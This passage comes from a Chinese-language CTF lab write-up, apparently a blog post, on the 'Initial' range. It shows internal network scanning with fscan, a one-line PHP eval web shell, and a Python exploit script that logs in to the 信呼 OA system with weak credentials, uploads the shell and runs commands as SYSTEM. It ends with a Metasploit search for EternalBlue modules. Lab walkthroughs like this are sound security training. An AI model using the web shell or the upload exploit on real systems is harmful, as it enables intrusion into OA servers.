+</span></span><span class=line><span class=cl>root@ubuntu-web01:/tmp# 
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@ubuntu-web01:/tmp# ifconfig
+</span></span><span class=line><span class=cl>ifconfig
+</span></span><span class=line><span class=cl>eth0: <span class=nv>flags</span><span class=o>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class=m>1500</span>
+</span></span><span class=line><span class=cl>        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255
+</span></span><span class=line><span class=cl>        inet6 fe80::216:3eff:fe2b:eeb4  prefixlen <span class=m>64</span>  scopeid 0x20&lt;link&gt;
+</span></span><span class=line><span class=cl>        ether 00:16:3e:2b:ee:b4  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Ethernet<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX packets <span class=m>148714</span>  bytes <span class=m>206304284</span> <span class=o>(</span>206.3 MB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
+</span></span><span class=line><span class=cl>        TX packets <span class=m>44225</span>  bytes <span class=m>6093177</span> <span class=o>(</span>6.0 MB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>lo: <span class=nv>flags</span><span class=o>=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class=m>65536</span>
+</span></span><span class=line><span class=cl>        inet 127.0.0.1  netmask 255.0.0.0
+</span></span><span class=line><span class=cl>        inet6 ::1  prefixlen <span class=m>128</span>  scopeid 0x10&lt;host&gt;
+</span></span><span class=line><span class=cl>        loop  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Local Loopback<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX packets <span class=m>1554</span>  bytes <span class=m>145035</span> <span class=o>(</span>145.0 KB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
+</span></span><span class=line><span class=cl>        TX packets <span class=m>1554</span>  bytes <span class=m>145035</span> <span class=o>(</span>145.0 KB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
+</span></span></code></pre></div><p>ifconfig查看内网网段信息，然后使用fscan进行扫描</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@ubuntu-web01:/tmp# ./fscan -h 172.22.1.0/24
+</span></span><span class=line><span class=cl>./fscan -h 172.22.1.0/24
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   ___                              _    
+</span></span><span class=line><span class=cl>  / _ <span class=se>\ </span>    ___  ___ _ __ __ _  ___<span class=p>|</span> <span class=p>|</span> __ 
+</span></span><span class=line><span class=cl> / /_<span class=se>\/</span>____/ __<span class=p>|</span>/ __<span class=p>|</span> <span class=err>&#39;</span>__/ _<span class=sb>`</span> <span class=p>|</span>/ __<span class=p>|</span> <span class=p>|</span>/ /
+</span></span><span class=line><span class=cl>/ /_<span class=se>\\</span>_____<span class=se>\_</span>_ <span class=se>\ </span><span class=o>(</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>__<span class=p>|</span>   &lt;    
+</span></span><span class=line><span class=cl><span class=se>\_</span>___/     <span class=p>|</span>___/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>_,_<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span><span class=se>\_\ </span>  
+</span></span><span class=line><span class=cl>                     fscan version: 1.8.4
+</span></span><span class=line><span class=cl>start infoscan
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.1.15     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.1.2      is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.1.21     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.1.18     is alive
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Icmp alive hosts len is: <span class=m>4</span>
+</span></span><span class=line><span class=cl>172.22.1.18:3306 open
+</span></span><span class=line><span class=cl>172.22.1.18:445 open
+</span></span><span class=line><span class=cl>172.22.1.21:445 open
+</span></span><span class=line><span class=cl>172.22.1.2:445 open
+</span></span><span class=line><span class=cl>172.22.1.15:22 open
+</span></span><span class=line><span class=cl>172.22.1.18:139 open
+</span></span><span class=line><span class=cl>172.22.1.21:139 open
+</span></span><span class=line><span class=cl>172.22.1.2:139 open
+</span></span><span class=line><span class=cl>172.22.1.18:135 open
+</span></span><span class=line><span class=cl>172.22.1.21:135 open
+</span></span><span class=line><span class=cl>172.22.1.2:135 open
+</span></span><span class=line><span class=cl>172.22.1.18:80 open
+</span></span><span class=line><span class=cl>172.22.1.15:80 open
+</span></span><span class=line><span class=cl>172.22.1.2:88 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>14</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.1.21
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>XIAORANG-WIN7
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.1.21
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.1.2
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>DC01
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.1.2
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.1.18
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>XIAORANG-OA01
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.1.18
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.1.2      <span class=o>[</span>+<span class=o>]</span> DC:DC01.xiaorang.lab             Windows Server <span class=m>2016</span> Datacenter <span class=m>14393</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> OsInfo 172.22.1.2	<span class=o>(</span>Windows Server <span class=m>2016</span> Datacenter 14393<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server <span class=m>2008</span> R2 Enterprise <span class=m>7601</span> Service Pack <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> MS17-010 172.22.1.21	<span class=o>(</span>Windows Server <span class=m>2008</span> R2 Enterprise <span class=m>7601</span> Service Pack 1<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m<span class=o>=</span>login
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.1.18?m<span class=o>=</span>login code:200 len:4012   title:信呼协同办公系统
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server <span class=m>2012</span> R2 Datacenter <span class=m>9600</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
+</span></span><span class=line><span class=cl>已完成 14/14
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 扫描结束,耗时: 8.048895233s
+</span></span></code></pre></div><p>看这四台机器</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.1.15     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.1.2      is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.1.21     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.1.18     is alive
+</span></span></code></pre></div><p>15我们已经拿下了，21存在一个MS17-010,18是一个交信呼协同办公系统的玩意，2则是DC01</p><p>现在需要建立本机的内网代理，方便我们对内网进行攻击</p><p>利用proxifier搭建代理，这里不多说</p><p>访问172.72.1.18，这里存在弱口令admin/admin123</p><p>同时这个信呼OA存在漏洞，我们可以直接用exp来打</p><p>这里弄一个1.php</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;1&#34;</span><span class=p>]);</span><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>这里弄一个脚本exp.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=n>url_pre</span> <span class=o>=</span> <span class=s1>&#39;http://172.22.1.18/&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>url1</span> <span class=o>=</span> <span class=n>url_pre</span> <span class=o>+</span> <span class=s1>&#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>url2</span> <span class=o>=</span> <span class=n>url_pre</span> <span class=o>+</span> <span class=s1>&#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>url3</span> <span class=o>=</span> <span class=n>url_pre</span> <span class=o>+</span> <span class=s1>&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#39;</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=n>data1</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;rempass&#39;</span><span class=p>:</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;jmpass&#39;</span><span class=p>:</span> <span class=s1>&#39;false&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;device&#39;</span><span class=p>:</span> <span class=s1>&#39;1625884034525&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;ltype&#39;</span><span class=p>:</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;adminuser&#39;</span><span class=p>:</span> <span class=s1>&#39;YWRtaW4=&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;adminpass&#39;</span><span class=p>:</span> <span class=s1>&#39;YWRtaW4xMjM=&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;yanzm&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url1</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url2</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;file&#39;</span><span class=p>:</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;1.php&#39;</span><span class=p>,</span> <span class=s1>&#39;r+&#39;</span><span class=p>)})</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=n>filepath</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;filepath&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>filepath</span> <span class=o>=</span> <span class=s2>&#34;/&#34;</span> <span class=o>+</span> <span class=n>filepath</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;.uptemp&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;.php&#39;</span>
+</span></span><span class=line><span class=cl><span class=nb>id</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=n>url3</span> <span class=o>=</span> <span class=n>url_pre</span> <span class=o>+</span> <span class=sa>f</span><span class=s1>&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=</span><span class=si>{</span><span class=nb>id</span><span class=si>}</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url_pre</span> <span class=o>+</span> <span class=n>filepath</span> <span class=o>+</span> <span class=s2>&#34;?1=system(&#39;dir&#39;);&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span></code></pre></div><p>然后通过proxychains来打</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# proxychains python3 test.py                                                                                           
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> config file found: /etc/proxychains4.conf
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.18:80  ...  OK
+</span></span><span class=line><span class=cl>&lt;br /&gt;
+</span></span><span class=line><span class=cl>&lt;b&gt;Notice&lt;/b&gt;:  Undefined offset: <span class=m>1</span> in &lt;b&gt;C:<span class=se>\p</span>hpStudy<span class=se>\P</span>HPTutorial<span class=se>\W</span>WW<span class=se>\u</span>pload<span class=se>\2</span>025-11<span class=se>\0</span>5_20335282.php&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;br /&gt;
+</span></span></code></pre></div><p>成功打入<br>用相对路径访问一下</p><p><img class=article-content-image src=/image/Initial4.png loading=lazy decoding=async alt="alt text"></p><p>看一下，发现是存在的，使用哥斯拉连接</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>currentDir:C:/phpStudy/PHPTutorial/WWW/upload/2025-11/
+</span></span><span class=line><span class=cl>fileRoot:<span class=o>[</span>C:/<span class=o>]</span>
+</span></span><span class=line><span class=cl>currentUser:SYSTEM
+</span></span><span class=line><span class=cl>osInfo:Windows NT XIAORANG-OA01 6.3 build <span class=m>9600</span> <span class=o>(</span>Windows Server <span class=m>2012</span> R2 Datacenter Edition<span class=o>)</span> i586
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:/phpStudy/PHPTutorial/WWW/upload/2025-11/ &gt;whoami
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>C:/phpStudy/PHPTutorial/WWW/upload/2025-11/ &gt;
+</span></span></code></pre></div><p>直接就是system用户，那我们直接拿flag<br><img class=article-content-image src=/image/Initial5.png loading=lazy decoding=async alt="alt text"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ___    ___ ___  ________  ________  ________  ________  ________   ________     
+</span></span><span class=line><span class=cl><span class=p>|</span><span class=se>\ </span> <span class=se>\ </span> /  /<span class=p>|</span><span class=se>\ </span> <span class=se>\|\ </span>  __  <span class=se>\|\ </span>  __  <span class=se>\|\ </span>  __  <span class=se>\|\ </span>  __  <span class=se>\|\ </span>  ___  <span class=se>\|\ </span>  ____<span class=se>\ </span>   
+</span></span><span class=line><span class=cl><span class=se>\ \ </span> <span class=se>\/</span>  / <span class=p>|</span> <span class=se>\ </span> <span class=se>\ \ </span> <span class=se>\|\ </span> <span class=se>\ \ </span> <span class=se>\|\ </span> <span class=se>\ \ </span> <span class=se>\|\ </span> <span class=se>\ \ </span> <span class=se>\|\ </span> <span class=se>\ \ </span> <span class=se>\\</span> <span class=se>\ </span> <span class=se>\ \ </span> <span class=se>\_</span>__<span class=p>|</span>    
+</span></span><span class=line><span class=cl> <span class=se>\ \ </span>   / / <span class=se>\ \ </span> <span class=se>\ \ </span>  __  <span class=se>\ \ </span> <span class=se>\\\ </span> <span class=se>\ \ </span>  _  _<span class=se>\ \ </span>  __  <span class=se>\ \ </span> <span class=se>\\</span> <span class=se>\ </span> <span class=se>\ \ </span> <span class=se>\ </span> ___  
+</span></span><span class=line><span class=cl>  /     <span class=se>\/</span>   <span class=se>\ \ </span> <span class=se>\ \ </span> <span class=se>\ \ </span> <span class=se>\ \ </span> <span class=se>\\\ </span> <span class=se>\ \ </span> <span class=se>\\</span>  <span class=se>\\</span> <span class=se>\ </span> <span class=se>\ \ </span> <span class=se>\ \ </span> <span class=se>\\</span> <span class=se>\ </span> <span class=se>\ \ </span> <span class=se>\|\ </span> <span class=se>\ </span>
+</span></span><span class=line><span class=cl> /  /<span class=se>\ </span>  <span class=se>\ </span>   <span class=se>\ \_</span>_<span class=se>\ \_</span>_<span class=se>\ \_</span>_<span class=se>\ \_</span>______<span class=se>\ \_</span>_<span class=se>\\</span> _<span class=se>\\</span> <span class=se>\_</span>_<span class=se>\ \_</span>_<span class=se>\ \_</span>_<span class=se>\\</span> <span class=se>\_</span>_<span class=se>\ \_</span>______<span class=se>\
+</span></span></span><span class=line><span class=cl>/__/ /<span class=se>\ </span>__<span class=se>\ </span>   <span class=se>\|</span>__<span class=p>|</span><span class=se>\|</span>__<span class=p>|</span><span class=se>\|</span>__<span class=p>|</span><span class=se>\|</span>_______<span class=p>|</span><span class=se>\|</span>__<span class=p>|</span><span class=se>\|</span>__<span class=p>|</span><span class=se>\|</span>__<span class=p>|</span><span class=se>\|</span>__<span class=p>|</span><span class=se>\|</span>__<span class=p>|</span> <span class=se>\|</span>__<span class=p>|</span><span class=se>\|</span>_______<span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>__<span class=p>|</span>/ <span class=se>\|</span>__<span class=p>|</span>                                                                      
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag02: 2ce3-4813-87d4-
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Awesome! ! ! You found the second flag, now you can attack the domain controller.
+</span></span></code></pre></div><h2 id=flag3>flag3</h2><p>21这台机器是存在永恒之蓝的，直接对这个下手看看</p><p>使用msf,先通过proxychains限定一下msf走的流量</p><p>然后搜索ms17相关的</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# proxychains msfconsole
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> config file found: /etc/proxychains4.conf
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>Metasploit tip: Enable verbose logging with <span class=nb>set</span> VERBOSE <span class=nb>true</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17le...<span class=p>|</span>
+</span></span><span class=line><span class=cl>                                                  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> ______________________________________________________________________________
+</span></span><span class=line><span class=cl><span class=p>|</span>                                                                              <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>                   METASPLOIT CYBER MISSILE COMMAND V5                        <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>______________________________________________________________________________<span class=p>|</span>
+</span></span><span class=line><span class=cl>      <span class=se>\ </span>                                 /                      /
+</span></span><span class=line><span class=cl>       <span class=se>\ </span>    .                          /                      /            x
+</span></span><span class=line><span class=cl>        <span class=se>\ </span>                             /                      /
+</span></span><span class=line><span class=cl>         <span class=se>\ </span>                           /          +           /
+</span></span><span class=line><span class=cl>          <span class=se>\ </span>           +             /                      /
+</span></span><span class=line><span class=cl>           *                        /                      /
+</span></span><span class=line><span class=cl>                                   /      .               /
+</span></span><span class=line><span class=cl>    X                             /                      /            X
+</span></span><span class=line><span class=cl>                                 /                     <span class=c1>###</span>
+</span></span><span class=line><span class=cl>                                /                     <span class=c1># % #</span>
+</span></span><span class=line><span class=cl>                               /                       <span class=c1>###</span>
+</span></span><span class=line><span class=cl>                      .       /
+</span></span><span class=line><span class=cl>     .                       /      .            *           .
+</span></span><span class=line><span class=cl>                            /
+</span></span><span class=line><span class=cl>                           *
+</span></span><span class=line><span class=cl>                  +                       *
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                                       ^
+</span></span><span class=line><span class=cl><span class=c1>####      __     __     __          #######         __     __     __        ####</span>
+</span></span><span class=line><span class=cl><span class=c1>####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####</span>
+</span></span><span class=line><span class=cl><span class=c1>################################################################################</span>
+</span></span><span class=line><span class=cl><span class=c1>################################################################################</span>
+</span></span><span class=line><span class=cl><span class=c1># WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #</span>
+</span></span><span class=line><span class=cl><span class=c1>################################################################################</span>
+</span></span><span class=line><span class=cl>                                                           https://metasploit.com
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       <span class=o>=[</span> metasploit v6.4.84-dev                                <span class=o>]</span>
+</span></span><span class=line><span class=cl>+ -- --<span class=o>=[</span> 2,547 exploits - 1,309 auxiliary - 1,680 payloads     <span class=o>]</span>
+</span></span><span class=line><span class=cl>+ -- --<span class=o>=[</span> <span class=m>431</span> post - <span class=m>49</span> encoders - <span class=m>13</span> nops - <span class=m>9</span> evasion          <span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Metasploit Documentation: https://docs.metasploit.com/
+</span></span><span class=line><span class=cl>The Metasploit Framework is a Rapid7 Open Source Project
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>msf &gt; search ms17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
+</span></span><span class=line><span class=cl><span class=o>================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   <span class=c1>#   Name                                                  Disclosure Date  Rank     Check  Description</span>
+</span></span><span class=line><span class=cl>   -   ----                                                  ---------------  ----     -----  -----------
+</span></span><span class=line><span class=cl>   <span class=m>0</span>   exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+</span></span><span class=line><span class=cl>   <span class=m>1</span>     <span class=se>\_</span> target: Automatic Target                         .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>2</span>     <span class=se>\_</span> target: Windows <span class=m>7</span>                                .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>3</span>     <span class=se>\_</span> target: Windows Embedded Standard <span class=m>7</span>              .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>4</span>     <span class=se>\_</span> target: Windows Server <span class=m>2008</span> R2                   .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>5</span>     <span class=se>\_</span> target: Windows <span class=m>8</span>                                .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>6</span>     <span class=se>\_</span> target: Windows 8.1                              .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>7</span>     <span class=se>\_</span> target: Windows Server <span class=m>2012</span>                      .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>8</span>     <span class=se>\_</span> target: Windows <span class=m>10</span> Pro                           .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>9</span>     <span class=se>\_</span> target: Windows <span class=m>10</span> Enterprise Evaluation         .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>10</span>  exploit/windows/smb/ms17_010_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+</span></span><span class=line><span class=cl>   <span class=m>11</span>    <span class=se>\_</span> target: Automatic                                .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>12</span>    <span class=se>\_</span> target: PowerShell                               .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>13</span>    <span class=se>\_</span> target: Native upload                            .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>14</span>    <span class=se>\_</span> target: MOF upload                               .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>15</span>    <span class=se>\_</span> AKA: ETERNALSYNERGY                              .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>16</span>    <span class=se>\_</span> AKA: ETERNALROMANCE                              .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>17</span>    <span class=se>\_</span> AKA: ETERNALCHAMPION                             .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>18</span>    <span class=se>\_</span> AKA: ETERNALBLUE                                 .                .        .      .
